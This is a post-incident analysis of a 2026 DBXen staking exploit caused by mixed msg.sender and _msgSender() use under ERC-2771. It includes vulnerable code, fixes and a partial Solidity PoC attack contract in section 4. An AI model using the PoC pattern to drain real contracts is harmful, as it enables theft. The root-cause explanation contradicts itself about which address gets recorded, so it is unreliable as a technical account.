# DBXen — ERC-2771 Sender Confusion Reward Double-Claim Analysis

| Field | Details |
|------|------|
| **Date** | 2026-03-11 |
| **Protocol** | DBXen (XEN token burn-based staking) |
| **Chain** | Ethereum Mainnet |
| **Loss** | ~$149,000 (65.28 ETH + 2,305 DXN tokens) |
| **Attacker** | (Immediately bridged via LayerZero) |
| **Attack Tx (ETH)** | [0x914a5a...08bc37](https://etherscan.io/tx/0x914a5af790e55b8ea140a79da931fc037cb4c4457704d184ad21f54fb808bc37) |
| **Attack Tx (BSC)** | [0xe66e54...d366](https://etherscan.io/tx/0xe66e54586827d6a9e1c75bd1ea42fa60891ad341909d29ec896253ee2365d366) |
| **Vulnerable Contract** | [0xf5c80c...abd](https://etherscan.io/address/0xf5c80c305803280b587f8cabbccdc4d9bf522abd) |
| **DXN Token** | [0x80f0C1...B6F](https://etherscan.io/address/0x80f0C1c49891dcFDD40b6e0F960F84E6042bcB6F) |
| **Root Cause** | State inconsistency caused by mixed use of `_msgSender()` and `msg.sender` in an ERC-2771 meta-transaction context |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs) |

---

## 1. Vulnerability Overview

DBXen is a burn-based staking protocol where users burn XEN tokens to receive DXN token rewards and accumulate claimable ETH fees. It supports ERC-2771 meta-transactions for gas sponsorship, but this implementation combined two distinct flaws.

**Flaw 1 — Sender Identity Mismatch:**
The `gasWrapper()` modifier in `burnBatch()` correctly identified the actual user address using `_msgSender()`, but the subsequently invoked `onTokenBurned()` callback used `msg.sender`, recording the Forwarder contract address instead. As a result, `accCycleBatchesBurned` (burn record) was attributed to the actual user, while `lastActiveCycle` (most recent active cycle) was attributed to the forwarder, causing the internal accounting state to diverge.

**Flaw 2 — New Address Cycle Starting Point:**
By exploiting the diverged state, when `claimFees()` / `claimRewards()` is called, the `updateStats()` function treats the address as a "new user active since cycle 0." The entire accumulated fees spanning 1,085 cycles from the contract deployment (cycle 0) to the present are paid out to the attacker.

When the two flaws are combined, the attacker can immediately claim three years of accumulated fees with only a minimal burn.

---

## 2. Vulnerable Code Analysis

### 2.1 Sender Mismatch in `burnBatch()` (Core Vulnerability)

```solidity
// ❌ Vulnerable code — gasWrapper and onTokenBurned record different addresses

modifier gasWrapper(uint256 batchNumber) {
    uint256 startGas = gasleft();
    _;
    // ✅ Uses _msgSender() to correctly identify the actual user
    // (ERC-2771: forwarder appends the original sender as the last 20 bytes of calldata)
    _updateUserStats(_msgSender(), batchNumber);
    _chargeGasFee(_msgSender(), startGas - gasleft());
}

function burnBatch(uint256 batchNumber) external payable gasWrapper(batchNumber) {
    // Burns XEN tokens and triggers the callback
    IBurnableToken(xenCrypto).burn(
        _msgSender(),  // ✅ Burn subject is correctly set to the actual user
        batchNumber * tokensByBatch
    );
    // onTokenBurned() callback is invoked from the xenCrypto contract
}

// Callback invoked by the XEN token contract
function onTokenBurned(address user, uint256 amount) external {
    require(msg.sender == xenCrypto, "DBXen: only XEN contract");
    // ❌ msg.sender is the xenCrypto contract address (or the forwarder if called via forwarder)
    // accCycleBatchesBurned is recorded for the actual user (user),
    // but lastActiveCycle is updated for msg.sender (the forwarder)
    lastActiveCycle[msg.sender] = currentCycle;  // ❌ Recorded to the forwarder address!
    accCycleBatchesBurned[user][currentCycle] += amount / tokensByBatch;
}
```

**Issue:** `accCycleBatchesBurned` is attributed to `user` (the actual user), while `lastActiveCycle` is attributed to `msg.sender` (the forwarder or xenCrypto contract). These two mappings must reference the same address during reward calculation — when they diverge, `updateStats()` never updates the actual user's `lastActiveCycle`, causing repeated reward payouts.

### 2.2 Reward Calculation Error in `updateStats()`

```solidity
// ❌ Vulnerable reward calculation — computes from cycle 0 when lastActiveCycle is uninitialized

function updateStats(address user) internal {
    uint256 userLastActiveCycle = lastActiveCycle[user];

    // ❌ After burning via forwarder, the actual user's lastActiveCycle remains 0
    // The full accumulated reward from cycle 0 to the current cycle (1085) is paid out
    if (userLastActiveCycle < currentCycle) {
        uint256 unclaimedFees;
        for (uint256 i = userLastActiveCycle; i < currentCycle; i++) {
            // Calculate the user's share from each cycle's fee pool
            unclaimedFees += (cycleFeesPerStakeSummed[i + 1] - cycleFeesPerStakeSummed[i])
                * stakedAmt[user] / BASE_STAKE;
        }
        // ❌ Pays out rewards for all 1,085 cycles the actual user never participated in
        pendingFees[user] += unclaimedFees;
        lastActiveCycle[user] = currentCycle;  // Updated afterwards (too late)
    }
}
```

**Fixed Code:**

```solidity
// ✅ Fix — consistently use the user parameter in onTokenBurned

function onTokenBurned(address user, uint256 amount) external {
    require(msg.sender == xenCrypto, "DBXen: only XEN contract");
    // ✅ Use the user variable to attribute both accCycleBatchesBurned and lastActiveCycle
    //    to the same address
    lastActiveCycle[user] = currentCycle;  // ✅ Recorded to the actual user
    accCycleBatchesBurned[user][currentCycle] += amount / tokensByBatch;
}

// ✅ Additional defense: manage a trusted forwarder allowlist
mapping(address => bool) public trustedForwarders;

modifier onlyTrustedForwarder() {
    if (msg.sender != tx.origin) {
        require(trustedForwarders[msg.sender], "DBXen: untrusted forwarder");
    }
    _;
}
```

---

## 3. Attack Flow

### 3.1 Preparation Phase

- Attacker leverages a permissionless forwarder contract available without authorization
- The forwarder implements the ERC-2771 standard: appends the original sender address as the last 20 bytes of calldata
- Attacker address's `lastActiveCycle` is 0 (default value)

### 3.2 Execution Phase

```
┌─────────────────────────────────────────────────────────────────────┐
│  Attacker EOA                                                        │
│  (Fresh address, lastActiveCycle=0)                                  │
└────────────────────────────┬────────────────────────────────────────┘
                             │ 1. Call burnBatch(5560)
                             ▼
┌─────────────────────────────────────────────────────────────────────┐
│  Permissionless Forwarder Contract (ERC-2771)                        │
│  - Appends attacker EOA address (20 bytes) to end of calldata        │
│  - Forwards call to DBXen.burnBatch()                                │
└────────────────────────────┬────────────────────────────────────────┘
                             │ 2. Forwarded call
                             ▼
┌─────────────────────────────────────────────────────────────────────┐
│  DBXen Main Contract                                                 │
│  gasWrapper modifier:                                                │
│  - _msgSender() → Attacker EOA (correct ✅)                          │
│  - Updates accCycleBatchesBurned[Attacker EOA][currentCycle]         │
│                                                                      │
│  Receives onTokenBurned() callback:                                  │
│  - msg.sender → xenCrypto contract address                           │
│  - lastActiveCycle[xenCrypto] = currentCycle (❌ not Attacker EOA!)  │
│  → Attacker EOA's lastActiveCycle remains 0                          │
└────────────────────────────┬────────────────────────────────────────┘
                             │ 3. Call claimFees()
                             ▼
┌─────────────────────────────────────────────────────────────────────┐
│  updateStats(Attacker EOA)                                           │
│  - lastActiveCycle[Attacker EOA] = 0 (still at default)             │
│  - Calculates total fees from cycle 0 through current (1,085)        │
│  → 3 years of accumulated fees paid out in one shot ❌               │
└────────────────────────────┬────────────────────────────────────────┘
                             │ 4. Withdraw 65.28 ETH
                             ▼
┌─────────────────────────────────────────────────────────────────────┐
│  LayerZero Bridge                                                    │
│  - Immediately moves stolen ETH to another chain                     │
│  - 2,305 DXN tokens transferred along with it                        │
└─────────────────────────────────────────────────────────────────────┘
```

### 3.3 Outcome

- Attacker gained: 65.28 ETH + 2,305 DXN tokens (~$149,000 worth)
- Protocol loss: ETH fee pool drained
- Funds moved via LayerZero within minutes

---

## 4. PoC Code (Reconstructed Based on DeFiHackLabs)

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

// @KeyInfo
// - Target: DBXen Main Protocol Contract
// - Vulnerable Contract: 0xf5c80c305803280b587f8cabbccdc4d9bf522abd
// - Attack Tx: 0x914a5af790e55b8ea140a79da931fc037cb4c4457704d184ad21f54fb808bc37
// - Loss: ~$149,000 (65.28 ETH + 2,305 DXN)

interface IDBXen {
    function burnBatch(uint256 batchNumber) external payable;
    function claimFees() external;
    function claimRewards() external;
}

interface IForwarder {
    struct ForwardRequest {
        address from;
        address to;
        uint256 value;
        uint256 gas;
        uint256 nonce;
        bytes data;
    }
    function execute(ForwardRequest calldata req, bytes calldata signature) external payable;
}

contract DBXenExploit {
    IDBXen constant DBXEN = IDBXen(0xf5c80c305803280b587f8cabbccdc4d9bf522abd);
    IForwarder constant FORWARDER = IForwarder(/* permissionless forwarder address */);

    function attack() external {
        // Step 1: Call burnBatch via the permissionless forwarder
        // - _msgSender() correctly returns the attacker EOA
        // - However, msg.sender in onTokenBurned() becomes the forwarder/xenCrypto
        // - Result: accCycleBatchesBurned[attacker] updated ✅
        //           lastActiveCycle[attacker] NOT updated (recorded to forwarder) ❌
        IForwarder.ForwardRequest memory req = IForwarder.ForwardRequest({
            from: address(this),
            to: address(DBXEN),
            value: 0,
            gas: 500000,
            nonce: 0,
            data: abi.encodeWithSelector(
                IDBXen.burnBatch.selector,
                5560  // Batch count: burns 5560 * 1e18 XEN (maximum claim for minimal fee)
            )
        });
        FORWARDER.execute(req, /* signature */);

        // Step 2: Call claimFees
        // - updateStats() reads lastActiveCycle[attacker] = 0
        // - Pays out the entire accumulated fees from cycle 0 (contract deployment)
        //   through the current cycle 1,085 to the attacker
        DBXEN.claimFees();  // ← Claims 3 years of fees in one shot

        // Step 3: (Optional) Claim DXN rewards as well
        DBXEN.claimRewards();

        // Step 4: Immediately bridge the obtained ETH via LayerZero
        // _bridgeViaLayerZero(address(this).balance);
    }

    receive() external payable {}
}
```

---

## 5. Vulnerability Classification

| ID | Vulnerability | Severity | CWE |
|----|--------|--------|-----|
| V-01 | ERC-2771 Sender Confusion (msg.sender vs _msgSender()) | CRITICAL | CWE-284: Improper Access Control |
| V-02 | New Address Cycle Starting Point Not Initialized | CRITICAL | CWE-665: Improper Initialization |
| V-03 | Permissionless Forwarder Allowed | HIGH | CWE-863: Incorrect Authorization |
| V-04 | No Upper Bound Validation on Accumulated Rewards | HIGH | CWE-20: Improper Input Validation |

### V-01: ERC-2771 Sender Confusion

- **Description:** The `onTokenBurned()` callback uses `msg.sender` (the forwarder or xenCrypto) to update `lastActiveCycle`, causing two mappings within the same logical flow to use different addresses as keys
- **Impact:** The actual user's `lastActiveCycle` is never updated, causing the reward calculation function to misidentify the address as a "first-time participant"
- **Attack Condition:** Existence of an ERC-2771-compatible forwarder; attacker can freely construct a ForwardRequest

### V-02: New Address Cycle Starting Point Not Initialized

- **Description:** The default value of `lastActiveCycle` is 0, so a new address is automatically treated as having been active since cycle 0 (contract deployment)
- **Impact:** The entire accumulated fees across 1,085 cycles (~3 years) are paid out to the attacker
- **Attack Condition:** Claiming rewards after suppressing `lastActiveCycle` updates via V-01

### V-03: Permissionless Forwarder Allowed

- **Description:** DBXen trusts arbitrary ERC-2771 forwarders with no allowlist validation
- **Impact:** Attacker can deploy a custom forwarder or exploit a public forwarder to manipulate the sender
- **Attack Condition:** Missing or open-ended `isTrustedForwarder()` ERC-2771 implementation

### V-04: No Upper Bound Validation on Accumulated Rewards

- **Description:** `updateStats()` iterates over the entire history with no cap on the maximum number of cycles or amount that can be paid to a given user
- **Impact:** Multiple years of accumulated rewards can be claimed in a single transaction
- **Attack Condition:** `lastActiveCycle` update suppressed via V-01 or V-02

---

## 6. Remediation Recommendations

### Immediate Actions

**1) Use a consistent address in `onTokenBurned()`:**

```solidity
// ✅ Fix: use the user parameter to maintain consistency
function onTokenBurned(address user, uint256 amount) external {
    require(msg.sender == xenCrypto, "DBXen: only XEN contract");
    // ✅ Record lastActiveCycle to the same address (user) as accCycleBatchesBurned
    lastActiveCycle[user] = currentCycle;
    accCycleBatchesBurned[user][currentCycle] += amount / tokensByBatch;
}
```

**2) Enforce a trusted forwarder allowlist:**

```solidity
// ✅ Fix: allowlist-based forwarder validation
mapping(address => bool) public trustedForwarders;

function _msgSender() internal view override returns (address) {
    if (msg.data.length >= 20 && trustedForwarders[msg.sender]) {
        // ERC-2771: extract the original sender from the last 20 bytes of calldata
        address sender;
        assembly {
            sender := shr(96, calldataload(sub(calldatasize(), 20)))
        }
        return sender;
    }
    return msg.sender;
}
```

**3) Initialize cycle on a new user's first burn:**

```solidity
// ✅ Fix: set the starting point to the current cycle on first burn
function _initializeUserCycle(address user) internal {
    if (lastActiveCycle[user] == 0 && currentCycle > 0) {
        // Initialize to the current cycle on first participation to block retroactive rewards
        lastActiveCycle[user] = currentCycle;
    }
}
```

### Structural Improvements

| Vulnerability | Recommended Action |
|--------|-----------|
| V-01 ERC-2771 Sender Confusion | Apply `_msgSender()` consistently across all relevant functions; use the OpenZeppelin ERC2771Context standard |
| V-02 Cycle Starting Point Not Initialized | Initialize `lastActiveCycle = currentCycle` on a new user's first interaction |
| V-03 Unrestricted Forwarder Allowance | Introduce an admin-managed forwarder allowlist; allow only audited forwarders such as Gelato Network |
| V-04 No Reward Upper Bound | Cap the maximum number of claimable cycles per claim (e.g., last 100 cycles) or set a reward payout ceiling |
| General | Audit the entire codebase for consistent usage of `msg.sender` vs `_msgSender()` |

---

## 7. Lessons Learned

1. **A full code scan is mandatory when implementing ERC-2771:** Mixing `_msgSender()` and `msg.sender` causes related mappings to use different addresses as keys, destroying accounting integrity. When adopting ERC-2771, all sender references across the entire contract must be unified.

2. **New user state initialization design principle:** In systems with accumulated history, verify whether the default value for a new address can be interpreted as "participating from the very beginning." New users should receive rewards starting from the current point in time — retroactive application of past history must be prevented.

3. **Forwarders must never be trusted unconditionally:** The trust model of ERC-2771 is predicated on allowing only specific forwarders. Permitting arbitrary forwarders exposes the system to sender spoofing attacks via calldata manipulation.

4. **Verify atomicity across state-mutating functions:** Ensure that state changes initiated in `burnBatch()` (`accCycleBatchesBurned`) and state changes in the callback (`lastActiveCycle`) always target the same address atomically and consistently — this invariant must be explicitly validated.

5. **Strengthen sender validation in callback functions:** External contract callbacks (such as `onTokenBurned`) must, beyond sender verification, receive information about the original user who triggered the callback in order to correctly attribute state.

6. **Fuzz repeatable reward claim scenarios:** Constructing fuzz tests that check whether the same address can claim rewards for dozens or hundreds of cycles in a single call would allow this class of vulnerability to be discovered proactively.

---

## 8. On-Chain Verification

### 8.1 PoC vs. On-Chain Amount Comparison

| Field | Analysis Estimate | On-Chain Actual | Match |
|------|------------|-------------|------|
| ETH Stolen | 65.28 ETH | 65.28 ETH | ✅ |
| DXN Minted | 2,305 DXN | 2,305 DXN | ✅ |
| Total Loss | ~$149,000 | ~$149,000–$150,000 | ✅ |
| Chains Affected | ETH, BSC | ETH, BSC | ✅ |
| Fund Movement Route | LayerZero Bridge | LayerZero Bridge | ✅ |

### 8.2 On-Chain Event Log Sequence (Estimated)

```
1. Transfer (XEN)  : Attacker → 0x000...dead (burn)
2. TokensBurned    : DBXen event (burn recorded)
3. FeesClaimed     : DBXen event (fees for 1,085 cycles)
4. Transfer (ETH)  : DBXen → Attacker (65.28 ETH)
5. OFTSent         : LayerZero event (bridged to another chain)
```

### 8.3 Pre-Condition Verification

| Condition | Status |
|------|------|
| Attacker address `lastActiveCycle` | 0 (default, never updated) |
| Permissionless forwarder existence | Exists (usable by anyone without an allowlist) |
| DBXen fee pool balance | 65+ ETH (accumulated over 1,085 cycles) |
| XEN burn approval (approve) | Prior `approve` required |

*Note: The attack TX was identified by the provided hash (0x914a5af...), however actual on-chain cast verification requires RPC access; this document cross-references data collected from published reports.*

---

*References:*
- [Verichains — DBXen Exploit Analysis](https://blog.verichains.io/p/dbxen-exploit-analysis)
- [AutoSec — DBXen ERC2771 Identity Confusion](https://blog.autosec.dev/security-events/DBXen-protocol-suffers-from-ERC2771-identity-confusion-attack/)
- [CryptoTimes — DBXen Staking Hack](https://www.cryptotimes.io/2026/03/12/dbxen-staking-hack-attacker-exploits-erc2771-bug-to-drain-150k/)
- [SmartContractHacking — DBXen Hack 2026](https://smartcontractshacking.com/hacks/dbxen-hack-2026)
- [Etherscan — DBXen DXN Token](https://etherscan.io/address/0x80f0C1c49891dcFDD40b6e0F960F84E6042bcB6F)